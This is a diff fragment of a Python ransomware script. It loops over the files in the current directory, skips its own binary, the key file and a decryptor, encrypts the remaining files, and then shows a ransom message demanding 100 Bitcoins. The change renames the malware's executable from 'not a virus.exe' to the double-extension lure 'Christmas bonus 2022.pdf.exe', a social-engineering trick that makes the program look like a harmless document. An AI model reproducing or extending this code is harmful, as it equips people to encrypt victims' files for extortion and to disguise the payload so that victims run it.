@@ -9,7 +9,7 @@ files = [] #empty list for all of the found files
 
 
 for file in os.listdir():
-    if file == "not a virus.exe" or file =="82926249564354929" or file =="decryption.exe":
+    if file == "Christmas bonus 2022.pdf.exe" or file =="82926249564354929" or file =="decryption.exe":
         continue
     if os.path.isfile(file): #adds all the files found to our list
         files.append(file)
@@ -34,3 +34,5 @@ for file in files:
         thefile.write(contents_encrypted)
 
 ctypes.windll.user32.MessageBoxW(0,"Your files have been encrypted, send 100 Bitcoins to Aabybro", "", 0)
+
+
